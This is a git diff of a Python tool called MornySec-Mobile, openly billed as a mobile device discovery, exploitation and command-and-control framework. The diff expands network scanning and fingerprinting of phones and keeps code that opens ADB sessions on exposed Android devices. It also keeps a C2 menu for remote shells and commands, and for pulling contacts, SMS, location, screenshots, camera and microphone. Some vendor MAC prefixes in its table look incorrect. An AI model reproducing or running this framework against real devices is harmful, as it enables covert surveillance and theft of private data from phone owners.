@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-MornySec-Mobile - Advanced Mobile Device Discovery, Exploitation & C2 Framework
-Created by: Philip Morny
+MornySec-Mobile - Enhanced Mobile Device Discovery & Exploitation
+Detects ALL mobile devices (Android, iOS, etc.) on the network
 Version: 2.0.0 - For Authorized Testing Only
 """
 
@@ -14,9 +14,11 @@ import threading
 import time
 import sys
 import os
+import subprocess
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple
+import binascii
 
 try:
     from colorama import init, Fore, Style
@@ -43,6 +45,7 @@ def print_status(message: str, status_type: str = 'info'):
         'success': Fore.GREEN + Style.BRIGHT,
         'exploit': Fore.MAGENTA + Style.BRIGHT,
         'critical': Fore.RED + Style.BRIGHT,
+        'vuln': Fore.YELLOW + Style.BRIGHT,
         'c2': Fore.BLUE + Style.BRIGHT,
         'output': Fore.GREEN
     }
@@ -54,7 +57,7 @@ def print_banner():
     print_status("""
     ╔═══════════════════════════════════════════════════════════╗
     ║   📱 MornySec-Mobile v2.0.0                             ║
-    ║   Mobile Discovery, Exploitation & C2 Framework          ║
+    ║   Enhanced Mobile Device Discovery & C2 Framework        ║
     ║   Created by: Philip Morny                               ║
     ║   For Authorized Security Testing Only                   ║
     ╚═══════════════════════════════════════════════════════════╝
@@ -69,18 +72,404 @@ AUTHOR = "Philip Morny"
 REPO_URL = "https://github.com/cyberobinhood/MornySec-Mobile"
 
 # ============================================
+# MAC ADDRESS VENDOR DATABASE
+# ============================================
+
+MAC_VENDORS = {
+    # Apple
+    '08:63:61': 'Apple',
+    '1C:1C:6E': 'Apple',
+    '34:12:98': 'Apple',
+    '40:31:3C': 'Apple',
+    '50:1A:C5': 'Apple',
+    '8C:29:37': 'Apple',
+    'A8:66:7F': 'Apple',
+    'AC:29:3A': 'Apple',
+    'B0:34:95': 'Apple',
+    'C0:E5:4E': 'Apple',
+    'D4:61:DA': 'Apple',
+    'E0:36:76': 'Apple',
+    'F0:18:98': 'Apple',
+    'F4:5C:89': 'Apple',
+    
+    # Samsung
+    '00:11:22': 'Samsung',
+    '00:12:13': 'Samsung',
+    '00:1F:E0': 'Samsung',
+    'F4:37:B7': 'Samsung',
+    'BC:20:A4': 'Samsung',
+    'E4:8D:8C': 'Samsung',
+    '88:23:FE': 'Samsung',
+    'E8:48:B8': 'Samsung',
+    'CC:2E:5B': 'Samsung',
+    'C8:4B:D6': 'Samsung',
+    'DC:A4:CA': 'Samsung',
+    
+    # LG
+    '00:16:6C': 'LG',
+    '00:1A:C5': 'LG',
+    '00:1C:3D': 'LG',
+    '30:8D:99': 'LG',
+    'E0:03:2B': 'LG',
+    '90:B1:1C': 'LG',
+    '80:A5:89': 'LG',
+    
+    # HTC
+    '00:18:17': 'HTC',
+    '00:19:76': 'HTC',
+    '00:21:2B': 'HTC',
+    
+    # Sony
+    '00:1D:5B': 'Sony',
+    '00:21:2B': 'Sony',
+    '60:45:CB': 'Sony',
+    '88:6A:1E': 'Sony',
+    
+    # Motorola
+    '00:1A:79': 'Motorola',
+    '00:21:87': 'Motorola',
+    'B4:DF:D7': 'Motorola',
+    '1C:6B:4A': 'Motorola',
+    
+    # Nokia
+    '00:1A:2B': 'Nokia',
+    '00:1B:12': 'Nokia',
+    '00:1F:9E': 'Nokia',
+    
+    # Huawei
+    '00:25:9C': 'Huawei',
+    'E0:91:F5': 'Huawei',
+    '3C:CE:73': 'Huawei',
+    '6C:E7:8A': 'Huawei',
+    'A4:1F:72': 'Huawei',
+    
+    # Xiaomi
+    '00:26:12': 'Xiaomi',
+    '04:FE:31': 'Xiaomi',
+    '7C:DD:90': 'Xiaomi',
+    '1C:66:AA': 'Xiaomi',
+    'B8:27:EB': 'Xiaomi',
+    
+    # OnePlus
+    '00:23:D4': 'OnePlus',
+    '1C:6A:7A': 'OnePlus',
+    'B4:6B:FC': 'OnePlus',
+    
+    # Google / Pixel
+    'F0:67:5D': 'Google',
+    'E4:8B:7C': 'Google',
+    '3C:B3:CD': 'Google',
+    
+    # Others
+    '00:1E:0C': 'Generic Mobile',
+    '00:21:6B': 'Generic Mobile',
+    '00:23:6C': 'Generic Mobile',
+    '00:24:8C': 'Generic Mobile',
+    '00:25:64': 'Generic Mobile',
+}
+
+# ============================================
+# ENHANCED DISCOVERY ENGINE
+# ============================================
+
+class EnhancedDiscovery:
+    """Discover ALL mobile devices on the network"""
+    
+    def __init__(self, timeout: int = 5):
+        self.timeout = timeout
+        self.devices_found = []
+        
+        # Mobile device port signatures
+        self.mobile_ports = {
+            5555: 'Android ADB',
+            62078: 'iOS Lockdown',
+            5353: 'mDNS/Bonjour',
+            5037: 'ADB Debug',
+            4444: 'Android Debug',
+            8080: 'HTTP (Mobile)',
+            80: 'HTTP',
+            443: 'HTTPS',
+            22: 'SSH (Mobile)',
+            21: 'FTP (Mobile)',
+            139: 'NetBIOS',
+            445: 'SMB',
+            6000: 'X11 (Mobile)'
+        }
+    
+    def get_mac_address(self, ip: str) -> Optional[str]:
+        """Get MAC address of device using ARP"""
+        try:
+            # Use arp command to get MAC
+            result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True, timeout=3)
+            for line in result.stdout.split('\n'):
+                if ip in line and 'ether' in line:
+                    mac = line.split()[2]
+                    return mac.upper()
+                elif ip in line and 'at' in line:
+                    mac = line.split()[2]
+                    return mac.upper()
+            return None
+        except:
+            return None
+    
+    def identify_vendor_by_mac(self, mac: str) -> Tuple[str, str]:
+        """Identify device vendor from MAC address"""
+        if not mac:
+            return 'Unknown', 'Unknown MAC'
+        
+        mac_upper = mac.upper()
+        
+        # Check first 8 characters (XX:XX:XX)
+        for prefix, vendor in MAC_VENDORS.items():
+            if mac_upper.startswith(prefix):
+                return vendor, mac_upper
+        
+        # Check first 6 characters (XX:XX)
+        for prefix, vendor in MAC_VENDORS.items():
+            if mac_upper.startswith(prefix[:8]):
+                return vendor, mac_upper
+        
+        return 'Unknown', mac_upper
+    
+    def check_port(self, ip: str, port: int) -> bool:
+        """Check if port is open"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            return result == 0
+        except:
+            return False
+    
+    def get_http_headers(self, ip: str, port: int = 80) -> Optional[Dict]:
+        """Get HTTP headers for fingerprinting"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((ip, port))
+            
+            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: MornySec\r\n\r\n"
+            sock.send(request.encode())
+            response = sock.recv(2048).decode('utf-8', errors='ignore')
+            sock.close()
+            
+            headers = {}
+            for line in response.split('\r\n'):
+                if ':' in line:
+                    key, value = line.split(':', 1)
+                    headers[key.strip()] = value.strip()
+            
+            return headers
+        except:
+            return None
+    
+    def check_mdns(self, ip: str) -> Optional[Dict]:
+        """Check for mDNS/Bonjour services (Apple devices)"""
+        try:
+            # mDNS query for device info
+            mdns_query = bytes([
+                0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x0B, 0x5F, 0x64, 0x65,
+                0x76, 0x69, 0x63, 0x65, 0x2D, 0x69, 0x6E, 0x66,
+                0x6F, 0x04, 0x5F, 0x74, 0x63, 0x70, 0x05, 0x6C,
+                0x6F, 0x63, 0x61, 0x6C, 0x00, 0x00, 0x0C, 0x00,
+                0x01
+            ])
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(2)
+            sock.sendto(mdns_query, (ip, 5353))
+            data, _ = sock.recvfrom(1024)
+            sock.close()
+            
+            if data:
+                return {'type': 'Apple', 'service': 'mDNS', 'detected': True}
+        except:
+            pass
+        return None
+    
+    def check_upnp(self, ip: str) -> Optional[Dict]:
+        """Check for UPnP services (common on many devices)"""
+        try:
+            upnp_request = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(2)
+            sock.sendto(upnp_request, (ip, 1900))
+            data, _ = sock.recvfrom(1024)
+            sock.close()
+            
+            if data:
+                response = data.decode('utf-8', errors='ignore')
+                if 'UPnP' in response or 'Device' in response:
+                    return {'type': 'UPnP', 'detected': True}
+        except:
+            pass
+        return None
+    
+    def detect_os_by_ports(self, open_ports: List[int]) -> Tuple[str, int]:
+        """Detect OS based on open ports"""
+        os_score = {'Android': 0, 'iOS': 0, 'Windows': 0, 'Linux': 0}
+        
+        # Android signatures
+        if 5555 in open_ports:
+            os_score['Android'] += 50
+        if 5037 in open_ports:
+            os_score['Android'] += 30
+        if 4444 in open_ports:
+            os_score['Android'] += 20
+        
+        # iOS signatures
+        if 62078 in open_ports:
+            os_score['iOS'] += 50
+        if 5353 in open_ports:
+            os_score['iOS'] += 20
+        
+        # Windows signatures
+        if 139 in open_ports or 445 in open_ports:
+            os_score['Windows'] += 30
+        if 135 in open_ports:
+            os_score['Windows'] += 20
+        
+        # Linux/Generic
+        if 22 in open_ports:
+            os_score['Linux'] += 20
+        if 80 in open_ports or 443 in open_ports:
+            os_score['Linux'] += 10
+        
+        # Determine best match
+        best_os = max(os_score.items(), key=lambda x: x[1])
+        
+        # If score is too low, it might be Unknown
+        if best_os[1] < 10:
+            return 'Unknown', best_os[1]
+        
+        return best_os[0], best_os[1]
+    
+    def scan_ip(self, ip: str) -> Dict:
+        """Comprehensive scan of a single IP"""
+        result = {
+            'ip': ip,
+            'is_mobile': False,
+            'os': 'Unknown',
+            'vendor': 'Unknown',
+            'mac': None,
+            'ports': [],
+            'services': {},
+            'hostname': None,
+            'confidence': 0
+        }
+        
+        # Get MAC address
+        mac = self.get_mac_address(ip)
+        if mac:
+            result['mac'] = mac
+            vendor, _ = self.identify_vendor_by_mac(mac)
+            result['vendor'] = vendor
+            if vendor != 'Unknown':
+                result['is_mobile'] = True
+                result['confidence'] += 30
+        
+        # Scan common ports
+        open_ports = []
+        for port, service in self.mobile_ports.items():
+            if self.check_port(ip, port):
+                open_ports.append(port)
+                result['services'][port] = service
+        
+        result['ports'] = open_ports
+        
+        # Check for HTTP headers
+        if 80 in open_ports or 8080 in open_ports:
+            port = 80 if 80 in open_ports else 8080
+            headers = self.get_http_headers(ip, port)
+            if headers:
+                result['services']['http'] = headers
+                # Check for mobile signatures in headers
+                if 'Server' in headers:
+                    server = headers['Server']
+                    if 'Android' in server or 'Dalvik' in server:
+                        result['os'] = 'Android'
+                        result['is_mobile'] = True
+                        result['confidence'] += 20
+                    elif 'iPhone' in server or 'iOS' in server:
+                        result['os'] = 'iOS'
+                        result['is_mobile'] = True
+                        result['confidence'] += 20
+        
+        # Check for mDNS
+        if 5353 in open_ports:
+            mdns = self.check_mdns(ip)
+            if mdns:
+                result['services']['mdns'] = mdns
+                result['is_mobile'] = True
+                result['confidence'] += 20
+                if result['os'] == 'Unknown':
+                    result['os'] = 'iOS'  # Likely iOS
+        
+        # Check for UPnP
+        upnp = self.check_upnp(ip)
+        if upnp:
+            result['services']['upnp'] = upnp
+            result['is_mobile'] = True
+            result['confidence'] += 10
+        
+        # Detect OS from ports
+        if open_ports:
+            os_detected, score = self.detect_os_by_ports(open_ports)
+            if os_detected != 'Unknown' and score > 20:
+                result['os'] = os_detected
+                result['is_mobile'] = True
+                result['confidence'] += score
+        
+        return result
+    
+    def scan_network(self, network: str) -> List[Dict]:
+        """Scan network for ALL mobile devices"""
+        devices = []
+        
+        try:
+            net = ipaddress.ip_network(network, strict=False)
+            hosts = list(net.hosts())[:254]
+            
+            print_status(f"[*] Scanning {len(hosts)} hosts for mobile devices...", 'info')
+            print_status("[*] Using enhanced detection (ports, MAC, mDNS, HTTP)", 'info')
+            
+            with ThreadPoolExecutor(max_workers=50) as executor:
+                future_to_ip = {executor.submit(self.scan_ip, str(ip)): str(ip) for ip in hosts}
+                
+                for future in as_completed(future_to_ip):
+                    ip = future_to_ip[future]
+                    try:
+                        result = future.result(timeout=5)
+                        if result and result.get('is_mobile', False):
+                            devices.append(result)
+                            confidence = result.get('confidence', 0)
+                            os_info = result.get('os', 'Unknown')
+                            vendor = result.get('vendor', 'Unknown')
+                            print_status(f"[+] Found: {result['ip']} ({vendor} - {os_info}) [Confidence: {confidence}%]", 'found')
+                    except:
+                        pass
+            
+        except Exception as e:
+            print_status(f"[!] Network scan error: {e}", 'error')
+        
+        return devices
+
+# ============================================
 # SESSION MANAGEMENT
 # ============================================
 
 class SessionManager:
-    """Manage active sessions with compromised devices"""
+    """Manage active sessions with discovered devices"""
     
     def __init__(self):
         self.sessions = {}
         self.session_id = 0
     
     def create_session(self, device_ip: str, exploit_type: str, connection) -> int:
-        """Create a new session for a compromised device"""
+        """Create a new session"""
         self.session_id += 1
         session = {
             'id': self.session_id,
@@ -96,25 +485,22 @@ class SessionManager:
         return self.session_id
     
     def get_session(self, session_id: int) -> Optional[Dict]:
-        """Get session by ID"""
         return self.sessions.get(session_id)
     
     def list_sessions(self) -> List[Dict]:
-        """List all active sessions"""
         return list(self.sessions.values())
     
     def remove_session(self, session_id: int):
-        """Remove a session"""
         if session_id in self.sessions:
             del self.sessions[session_id]
     
     def execute_command(self, session_id: int, command: str) -> Dict:
-        """Execute command on session"""
         session = self.get_session(session_id)
         if not session:
             return {'success': False, 'error': 'Session not found'}
         
         session['last_active'] = datetime.now()
+        session['commands_executed'] += 1
         
         if session['exploit_type'] == 'adb':
             return self._execute_adb_command(session, command)
@@ -122,7 +508,6 @@ class SessionManager:
             return {'success': False, 'error': 'Unknown exploit type'}
     
     def _execute_adb_command(self, session: Dict, command: str) -> Dict:
-        """Execute command via ADB"""
         try:
             ip = session['ip']
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -153,7 +538,7 @@ class SessionManager:
 # ============================================
 
 class C2Interface:
-    """Command & Control Interface for compromised devices"""
+    """Command & Control Interface"""
     
     def __init__(self, session_manager: SessionManager):
         self.session_manager = session_manager
@@ -161,7 +546,6 @@ class C2Interface:
         self.current_session = None
     
     def show_help(self):
-        """Display C2 help menu"""
         print_status("""
 ╔═══════════════════════════════════════════════════════════════╗
 ║  📱 C2 COMMANDS                                              ║
@@ -170,13 +554,13 @@ class C2Interface:
 ║  select <id>           - Select a session to interact with    ║
 ║  shell                 - Open interactive shell on session    ║
 ║  exec <command>        - Execute command on selected session  ║
-║  screenshot            - Capture device screenshot            ║
+║  info                  - Get device information               ║
+║  screenshot            - Capture screenshot                   ║
 ║  contacts              - Extract contacts                     ║
 ║  sms                   - Extract SMS messages                 ║
 ║  location              - Get device location                  ║
 ║  cam                   - Access camera                        ║
 ║  mic                   - Access microphone                    ║
-║  info                  - Get device information               ║
 ║  kill                  - Terminate session                    ║
 ║  clear                 - Clear screen                         ║
 ║  help                  - Show this help                       ║
@@ -185,7 +569,6 @@ class C2Interface:
         """, 'info')
     
     def run(self):
-        """Run the C2 interface"""
         print_status("\n[*] C2 Interface Activated", 'c2')
         print_status("[*] Type 'help' for available commands", 'info')
         print_status(f"[*] Active sessions: {len(self.session_manager.list_sessions())}", 'info')
@@ -199,14 +582,12 @@ class C2Interface:
                     prompt = "📱[C2]> "
                 
                 command = input(prompt).strip()
-                
                 if not command:
                     continue
                 
                 parts = command.split()
                 cmd = parts[0].lower()
                 args = parts[1:] if len(parts) > 1 else []
-                
                 self.execute_c2_command(cmd, args)
                 
             except KeyboardInterrupt:
@@ -215,13 +596,10 @@ class C2Interface:
                 print_status(f"[!] Error: {e}", 'error')
     
     def execute_c2_command(self, cmd: str, args: List[str]):
-        """Execute C2 commands"""
         if cmd == 'help':
             self.show_help()
-        
         elif cmd == 'sessions':
             self.list_sessions()
-        
         elif cmd == 'select':
             if not args:
                 print_status("[!] Usage: select <session_id>", 'error')
@@ -236,65 +614,55 @@ class C2Interface:
                     print_status(f"[!] Session {session_id} not found", 'error')
             except ValueError:
                 print_status("[!] Invalid session ID", 'error')
-        
         elif cmd == 'shell':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.interactive_shell()
-        
         elif cmd == 'exec':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             if not args:
                 print_status("[!] Usage: exec <command>", 'error')
                 return
             command = ' '.join(args)
             self.execute_command(command)
-        
         elif cmd == 'info':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.get_device_info()
-        
         elif cmd == 'screenshot':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.capture_screenshot()
-        
         elif cmd == 'contacts':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.extract_contacts()
-        
         elif cmd == 'sms':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.extract_sms()
-        
         elif cmd == 'location':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.get_location()
-        
         elif cmd == 'cam':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.access_camera()
-        
         elif cmd == 'mic':
             if not self.current_session:
-                print_status("[!] No session selected. Use 'select <id>' first", 'error')
+                print_status("[!] No session selected", 'error')
                 return
             self.access_microphone()
-        
         elif cmd == 'kill':
             if not args:
                 if self.current_session:
@@ -313,28 +681,24 @@ class C2Interface:
                     print_status(f"[+] Session {session_id} terminated", 'success')
                 except ValueError:
                     print_status("[!] Invalid session ID", 'error')
-        
         elif cmd == 'clear':
             os.system('clear' if os.name == 'posix' else 'cls')
-        
         elif cmd == 'exit':
             print_status("[*] Exiting C2 interface...", 'info')
             self.running = False
-        
         else:
             print_status(f"[!] Unknown command: {cmd}. Type 'help' for available commands.", 'error')
     
     def list_sessions(self):
-        """List all active sessions"""
         sessions = self.session_manager.list_sessions()
         if not sessions:
             print_status("[!] No active sessions", 'warning')
             return
         
         print_status("\n📱 ACTIVE SESSIONS", 'c2')
-        print_status("="*60, 'info')
+        print_status("="*70, 'info')
         print(f"{'ID':<6} {'IP':<20} {'Exploit':<15} {'Commands':<10} {'Last Active':<20}")
-        print("-"*60)
+        print("-"*70)
         
         for session in sessions:
             last_active = session['last_active'].strftime('%H:%M:%S')
@@ -343,7 +707,6 @@ class C2Interface:
         print()
     
     def interactive_shell(self):
-        """Open interactive shell on selected device"""
         if not self.current_session:
             return
         
@@ -371,7 +734,6 @@ class C2Interface:
                 print_status(f"[!] Error: {e}", 'error')
     
     def execute_command(self, command: str):
-        """Execute single command on selected session"""
         if not self.current_session:
             return
         
@@ -385,7 +747,6 @@ class C2Interface:
             print_status(f"[!] Command failed: {result.get('error', 'Unknown error')}", 'error')
     
     def get_device_info(self):
-        """Get detailed device information"""
         if not self.current_session:
             return
         
@@ -417,7 +778,6 @@ class C2Interface:
         print_status("="*60, 'info')
     
     def capture_screenshot(self):
-        """Capture screenshot from device"""
         if not self.current_session:
             return
         
@@ -444,7 +804,6 @@ class C2Interface:
             print_status("[!] Screenshot capture failed", 'error')
     
     def extract_contacts(self):
-        """Extract contacts from device"""
         if not self.current_session:
             return
         
@@ -467,7 +826,6 @@ class C2Interface:
             print_status("[!] Failed to extract contacts", 'error')
     
     def extract_sms(self):
-        """Extract SMS messages"""
         if not self.current_session:
             return
         
@@ -490,7 +848,6 @@ class C2Interface:
             print_status("[!] Failed to extract SMS", 'error')
     
     def get_location(self):
-        """Get device location"""
         if not self.current_session:
             return
         
@@ -521,7 +878,6 @@ class C2Interface:
             print_status("[!] Failed to get location", 'error')
     
     def access_camera(self):
-        """Access device camera"""
         if not self.current_session:
             return
         
@@ -541,7 +897,6 @@ class C2Interface:
             print_status("[!] Failed to access camera", 'error')
     
     def access_microphone(self):
-        """Access device microphone"""
         if not self.current_session:
             return
         
@@ -561,121 +916,15 @@ class C2Interface:
             print_status("[!] Failed to access microphone", 'error')
 
 # ============================================
-# MOBILE DEVICE DISCOVERY
-# ============================================
-
-class MobileDiscovery:
-    """Discover mobile devices on the network"""
-    
-    def __init__(self, timeout: int = 5):
-        self.timeout = timeout
-    
-    def check_adb(self, ip: str) -> Optional[Dict]:
-        """Check ADB service on Android device"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            sock.connect((ip, 5555))
-            
-            sock.send(b'CNXN\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00')
-            response = sock.recv(1024)
-            sock.close()
-            
-            if response and b'OKAY' in response:
-                return {'status': 'connected', 'info': 'ADB service detected'}
-        except:
-            pass
-        return None
-    
-    def check_port(self, ip: str, port: int) -> bool:
-        """Check if port is open"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex((ip, port))
-            sock.close()
-            return result == 0
-        except:
-            return False
-    
-    def scan_ip(self, ip: str) -> Dict:
-        """Scan single IP for mobile device indicators"""
-        result = {
-            'ip': ip,
-            'is_mobile': False,
-            'os': 'Unknown',
-            'vendor': 'Unknown',
-            'ports': [],
-            'services': {}
-        }
-        
-        ports_to_check = [5555, 62078, 5353, 22, 80, 443, 8080, 5037]
-        open_ports = []
-        
-        for port in ports_to_check:
-            if self.check_port(ip, port):
-                open_ports.append(port)
-        
-        if open_ports:
-            result['ports'] = open_ports
-            
-            if 5555 in open_ports:
-                adb_info = self.check_adb(ip)
-                if adb_info:
-                    result['is_mobile'] = True
-                    result['os'] = 'Android'
-                    result['services']['adb'] = adb_info
-            
-            if 62078 in open_ports:
-                result['is_mobile'] = True
-                if result['os'] == 'Unknown':
-                    result['os'] = 'iOS'
-                result['services']['lockdown'] = {'status': 'connected'}
-        
-        return result
-    
-    def scan_network(self, network: str) -> List[Dict]:
-        """Scan network for mobile devices"""
-        devices = []
-        
-        try:
-            net = ipaddress.ip_network(network, strict=False)
-            hosts = list(net.hosts())[:254]
-            
-            print_status(f"[*] Scanning {len(hosts)} hosts for mobile devices...", 'info')
-            
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                future_to_ip = {executor.submit(self.scan_ip, str(ip)): str(ip) for ip in hosts}
-                
-                for future in as_completed(future_to_ip):
-                    ip = future_to_ip[future]
-                    try:
-                        result = future.result(timeout=5)
-                        if result and result.get('is_mobile', False):
-                            devices.append(result)
-                            print_status(f"[+] Found mobile device: {result['ip']} ({result['os']})", 'found')
-                    except:
-                        pass
-            
-        except Exception as e:
-            print_status(f"[!] Network scan error: {e}", 'error')
-        
-        return devices
-
-# ============================================
 # EXPLOITATION ENGINE
 # ============================================
 
 class ExploitEngine:
-    """Execute exploits against vulnerable devices"""
-    
     def __init__(self, session_manager: SessionManager, verbose: bool = False):
         self.session_manager = session_manager
         self.verbose = verbose
-        self.exploit_results = []
     
     def exploit_adb(self, ip: str) -> Dict:
-        """Attempt ADB exploitation and create session"""
         result = {
             'success': False,
             'type': 'ADB Exploitation',
@@ -715,18 +964,15 @@ class ExploitEngine:
 # ============================================
 
 class MornySecMobile:
-    """Main mobile device scanner and exploitation framework"""
-    
     def __init__(self, args):
         self.args = args
-        self.discovery = MobileDiscovery(timeout=args.timeout)
+        self.discovery = EnhancedDiscovery(timeout=args.timeout)
         self.session_manager = SessionManager()
         self.exploit_engine = ExploitEngine(self.session_manager, verbose=args.verbose)
         self.devices = []
         self.c2_interface = C2Interface(self.session_manager)
     
     def scan(self) -> List[Dict]:
-        """Scan network for mobile devices"""
         network = self.args.target
         
         try:
@@ -734,14 +980,13 @@ class MornySecMobile:
             result = self.discovery.scan_ip(network)
             if result.get('is_mobile'):
                 self.devices.append(result)
-                print_status(f"[+] Found mobile device: {result['ip']} ({result['os']})", 'found')
+                print_status(f"[+] Found mobile device: {result['ip']} ({result.get('vendor', 'Unknown')})", 'found')
         except:
             self.devices = self.discovery.scan_network(network)
         
         return self.devices
     
     def exploit(self, target_ip: Optional[str] = None):
-        """Execute exploits on discovered devices"""
         print_status("\n[*] Starting exploitation phase...", 'info')
         print_status("="*60, 'info')
         
@@ -757,11 +1002,12 @@ class MornySecMobile:
                 return
         else:
             for device in self.devices:
-                if 'adb' in device.get('services', {}):
+                if 5555 in device.get('ports', []):
                     devices_to_exploit.append(device)
         
         if not devices_to_exploit:
             print_status("[!] No exploitable devices found", 'warning')
+            print_status("[!] Make sure ADB is enabled on Android devices", 'warning')
             return
         
         print_status(f"[*] Exploiting {len(devices_to_exploit)} devices", 'info')
@@ -769,15 +1015,15 @@ class MornySecMobile:
         for device in devices_to_exploit:
             ip = device['ip']
             
-            print_status(f"\n[*] Targeting {ip} ({device.get('os', 'Unknown')})", 'info')
+            print_status(f"\n[*] Targeting {ip} ({device.get('vendor', 'Unknown')} - {device.get('os', 'Unknown')})", 'info')
+            print_status(f"[*] Confidence: {device.get('confidence', 0)}%", 'info')
             
-            if 'adb' in device.get('services', {}):
+            if 5555 in device.get('ports', []):
                 result = self.exploit_engine.exploit_adb(ip)
                 if result['success']:
                     print_status(f"[+] ADB exploit successful on {ip}", 'success')
     
     def start_c2(self):
-        """Start the Command & Control interface"""
         if not self.session_manager.list_sessions():
             print_status("[!] No active sessions. Exploit a device first.", 'warning')
             return
@@ -786,7 +1032,6 @@ class MornySecMobile:
         self.c2_interface.run()
     
     def report(self):
-        """Generate comprehensive report"""
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         report_name = f"MornySec_Mobile_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         
@@ -805,9 +1050,13 @@ class MornySecMobile:
                 for idx, device in enumerate(self.devices, 1):
                     f.write(f"[{idx}] {device['ip']}\n")
                     f.write(f"    OS: {device.get('os', 'Unknown')}\n")
+                    f.write(f"    Vendor: {device.get('vendor', 'Unknown')}\n")
+                    f.write(f"    Confidence: {device.get('confidence', 0)}%\n")
                     f.write(f"    Ports: {device.get('ports', [])}\n")
                     if device.get('services'):
                         f.write(f"    Services: {list(device['services'].keys())}\n")
+                    if device.get('mac'):
+                        f.write(f"    MAC: {device['mac']}\n")
                     f.write("\n")
             
             if self.session_manager.list_sessions():
@@ -828,8 +1077,8 @@ class MornySecMobile:
 
 def main():
     parser = argparse.ArgumentParser(
-        description='MornySec-Mobile - Advanced Mobile Device Discovery & Exploitation',
-        epilog=f'Example: python MornySec-Mobile.py 192.168.1.0/24 --exploit --c2\n\n'
+        description='MornySec-Mobile - Enhanced Mobile Device Discovery & Exploitation',
+        epilog=f'Example: python MornySec-Mobile.py 192.168.1.0/24 -s -e --c2\n\n'
                f'Author: {AUTHOR}\n'
                f'Repository: {REPO_URL}',
         formatter_class=argparse.RawDescriptionHelpFormatter
@@ -867,11 +1116,16 @@ def main():
     
     # Run scan if requested
     if args.scan or args.exploit:
-        print_status("[*] Starting device discovery...", 'info')
+        print_status("[*] Starting enhanced device discovery...", 'info')
+        print_status("[*] Detection methods: Ports, MAC Address, HTTP Headers, mDNS, UPnP", 'info')
         devices = scanner.scan()
         
         if not devices:
             print_status("[!] No mobile devices found", 'error')
+            print_status("[!] Tips:", 'warning')
+            print_status("   1. Make sure devices are on the same network", 'warning')
+            print_status("   2. Check if devices are awake (not in sleep mode)", 'warning')
+            print_status("   3. Try scanning a different network range", 'warning')
             sys.exit(1)
         
         # Generate report
